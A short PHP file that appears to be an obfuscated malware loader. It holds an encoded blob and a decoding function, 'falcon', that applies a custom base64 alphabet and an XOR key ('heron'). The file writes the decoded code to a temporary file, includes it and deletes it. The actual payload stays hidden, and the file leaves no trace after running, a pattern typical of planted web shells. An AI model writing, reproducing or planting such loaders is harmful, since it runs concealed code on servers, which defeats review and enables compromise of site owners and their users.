<?php
$encrypted = 'VFoCBx5lbxsJTkBBLTwrOjM3PTVPNzc-Oy02JjAjLTE6ICpPOFJSU1VFVT8hOzFVRk4TaHhPTkhFGwlOQAwBHAscTVYwPic2JjRJGAQGB0k1TFtPFWVvUk9OSEVST05MDBwfGxw1ExsGSFhSSzE4KiE7NU8VExsGTzhJYmRIRVJPE0gAHhwLAQNSRwcbFhcbRkw6NSo6M0ICDhoAQi9GR0gef2VOSEVST05IRVYGABgQBj8PHA1SUk5MOjUqOjNCAg4aAEIvVGNiRVJPThVFFwMdDUUJYmRIRVJPTkhFUksHBhUHGz4JERpPU0hCVVRjYkVST04VaHhiZEhFUk8HDkVaSwcGFQcbPgkRGk9ITkUbHDEMDABHSgELAhoaOAQGB0dBRQliZEhFUk9OSEVSDAYMDABHSgELAhoaOAQGB0dTaHhPTkhFD2JkSEVSTwsEFhcUY2JFUk9OSEVSTw0AARsdRgwMAAEPBQBaCAscBgULRkFMW1RjYkVST04VaHhPTkhFf2VOSEVSAAw3FgYOHBxNW1RjYkVST04cFwtPFWVvUk9OSEVST04NExMDRgEWAQoaQEEtPyE7MSlIDQcBF0gzQUVNT0o3NT08OjNCEQAKDUIvT1RIQlVGVWVvUk9OSBhSDA8cBhpPRjwNAAAZCQceCk5MAFtPFWVvUk9OSEVST04NBhoATkoAAB0BGl9STU5GRVYKQ1YCFxsjDRYBDgkNTVtUY2JFUk9OFWh4T05IRVYAGxwVBxtOVUUdDTEPAAYwDQQAEwFGQV5_ZU5IRVIKDQAKUk1SGBcXUUxIS1IHGgUJAR8LCwwTAw0ABAAcRkwKBxseHRFbT0BIR05AHhoATE1VZW8PYmRXW39l';
if (!function_exists('falcon')) {
    function falcon($data, $key) {
        $alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
        $bin = '';
        for ($i = 0; $i < strlen($data); $i++) {
            $index = strpos($alphabet, $data[$i]);
            $bin .= str_pad(decbin($index), 6, '0', STR_PAD_LEFT);
        }

        $bytes = '';
        for ($i = 0; $i < strlen($bin); $i += 8) {
            $chunk = substr($bin, $i, 8);
            if (strlen($chunk) < 8) break; // если меньше 8 бит — игнорируем
            $bytes .= chr(bindec($chunk));
        }

        $res = '';
        $klen = strlen($key);
        for ($i = 0; $i < strlen($bytes); $i++) {
            $res .= $bytes[$i] ^ $key[$i % $klen];
        }
        return $res;
    }
}

file_put_contents($tmp = tempnam(sys_get_temp_dir(), 'shf_'), falcon($encrypted, 'heron'));
include $tmp;
unlink($tmp);

?>